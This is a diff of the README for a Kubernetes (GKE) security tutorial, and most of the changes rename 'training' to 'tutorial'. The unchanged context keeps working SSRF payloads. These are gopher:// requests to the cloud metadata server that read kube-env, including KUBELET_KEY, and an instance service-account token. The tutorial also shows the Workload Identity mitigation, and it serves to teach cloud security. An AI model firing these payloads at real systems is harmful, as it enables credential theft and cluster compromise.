@@ -1,7 +1,7 @@
-# training-gke-security
-This repository is for demo of training of GKE Security
+# tutorial-gke-security
+This repository is for a tutorial of "Kubernetes Security for Microservices"
 
-[![Open in Cloud Shell](http://gstatic.com/cloudssh/images/open-btn.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/rung/training-gke-security&page=editor&cloudshell_tutorial=README.md)
+[![Open in Cloud Shell](http://gstatic.com/cloudssh/images/open-btn.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/rung/tutorial-gke-security&page=editor&cloudshell_tutorial=README.md)
 
 ## Preparation
 #### Set project id
@@ -100,8 +100,8 @@ kubectl port-forward deployment/ssrf-server 8080:8080 2>&1 >/dev/null &
 ```
 
 #### Open Web Preview
-![web-preview](https://github.com/rung/training-gke-security/raw/master/img/web-preview.png)
-![web-page](https://github.com/rung/training-gke-security/raw/master/img/web-page.png)
+![web-preview](https://github.com/rung/tutorial-gke-security/raw/master/img/web-preview.png)
+![web-page](https://github.com/rung/tutorial-gke-security/raw/master/img/web-page.png)
 
 #### Input url (for testing)
 ```
@@ -115,7 +115,7 @@ gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/attributes/kube-en
 ```
 It contains "KUBELET_KEY".
 
-![web-metadata](https://github.com/rung/training-gke-security/raw/master/img/web-metadata.png)
+![web-metadata](https://github.com/rung/tutorial-gke-security/raw/master/img/web-metadata.png)
 
 #### Save the metadata to metadata-script/metadata.txt
 ```
@@ -172,7 +172,7 @@ mv ~/.kube/config.tmp ~/.kube/config
 kubectl config get-contexts
 ```
 
-#### (Reference) Get instance token (doesn't use it in this training)
+#### (Reference) Get instance token
 ```
 gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
 ```
@@ -188,9 +188,9 @@ gcloud beta container clusters update gke-security-testing --identity-namespace=
 gcloud beta container node-pools update default-pool --cluster=gke-security-testing --workload-metadata-from-node=GKE_METADATA_SERVER --zone us-central1-a
 ```
 
-![web-workload-identity-enabled.png](https://github.com/rung/training-gke-security/raw/master/img/web-workload-identity-enabled.png)
+![web-workload-identity-enabled.png](https://github.com/rung/tutorial-gke-security/raw/master/img/web-workload-identity-enabled.png)
 
-## (After this training) Delete cluster
+## (After this tutorial) Delete cluster
 ```bash
 gcloud container clusters delete gke-security-testing --zone us-central1-a --async
 ```
